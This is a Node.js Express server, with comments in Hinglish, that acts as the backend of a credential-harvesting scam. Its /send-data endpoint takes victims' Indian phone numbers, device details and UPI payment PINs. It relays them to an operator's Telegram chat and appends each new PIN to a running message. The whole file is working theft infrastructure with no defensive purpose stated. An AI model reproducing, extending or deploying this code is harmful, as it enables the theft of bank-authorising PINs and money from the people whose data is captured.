require('dotenv').config();
const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

const { PORT, BOT_TOKEN, CHAT_ID } = process.env;

// State management for editing the same message
let lastMessageId = null;
let currentMessageText = "";

const sendOrUpdateTelegram = async (message) => {
    try {
        if (!lastMessageId) {
            // Naya message bhejta hai jab pehli baar data aata hai
            const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            });
            lastMessageId = response.data.result.message_id;
            currentMessageText = message;
        } else {
            // Purane message ko hi edit karta hai naye PINs ke saath
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                chat_id: CHAT_ID,
                message_id: lastMessageId,
                text: message,
                parse_mode: 'Markdown'
            });
            currentMessageText = message;
        }
    } catch (error) {
        // Agar edit fail ho (e.g. message delete ho gaya), toh naya message bhej do
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        lastMessageId = response.data.result.message_id;
        currentMessageText = message;
    }
};

const startupNotification = async () => {
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: `*BJP Client's*`,
            parse_mode: 'Markdown'
        });
    } catch (e) {}
};

app.post('/send-data', async (req, res) => {
    const { type, number, pin, deviceId, deviceTime, deviceDate } = req.body;
    
    let updatedText = "";

    if (type === 'NUMBER') {
        // Naya session shuru: purani ID reset taaki naya block bane
        lastMessageId = null; 
        updatedText = `*Device Model:* ${deviceId || 'Detecting...'}\n`;
        updatedText += `*Date:* ${deviceDate || 'Detecting...'}\n`; 
        updatedText += `*Real Time:* ${deviceTime || 'Detecting...'}\n`; 
        updatedText += `*Number:* +91 ${number}\n`;
    } else if (pin) {
        // Purane text ke niche naya Bold UPI PIN add karega
        updatedText = currentMessageText + `*UPI PIN:* ${pin}\n`;
    }

    if (updatedText) {
        await sendOrUpdateTelegram(updatedText);
    }
    
    res.status(200).json({ success: true });
});

app.listen(PORT, () => {
    startupNotification();
});
